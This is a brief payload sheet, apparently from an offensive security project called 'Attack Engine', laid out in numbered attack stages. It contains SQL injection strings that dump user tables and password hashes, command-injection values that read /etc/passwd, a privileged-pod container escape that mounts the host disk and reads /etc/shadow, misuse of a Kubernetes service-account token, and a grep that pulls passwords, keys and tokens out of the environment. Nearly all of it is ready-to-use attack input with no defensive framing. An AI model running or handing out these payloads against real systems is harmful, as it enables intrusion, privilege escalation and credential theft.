\# Attack Engine — Phase 2 Payloads



\## 1. SQL Injection



\# All users dump

1' OR '1'='1



\# Database version

1' UNION SELECT null, version() -- -



\# Password hash dump

1' UNION SELECT user, password FROM users -- -



\## 2. Command Injection



\# User enumeration

127.0.0.1; whoami



\# System users

127.0.0.1; cat /etc/passwd



\## 3. Container Escape (Privileged Pod)



\# Mount host filesystem

mkdir /tmp/hostfs

mount /dev/sda /tmp/hostfs



\# Read host shadow file

cat /tmp/hostfs/etc/shadow



\## 4. RBAC Escalation



\# Query cluster from inside pod

APISERVER=https://kubernetes.default.svc

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -s $APISERVER/api/v1/namespaces --header "Authorization: Bearer $TOKEN" --insecure



\## 5. Secrets Extraction



\# Extract credentials from ENV

env | grep -E "PASSWORD|KEY|SECRET|TOKEN"

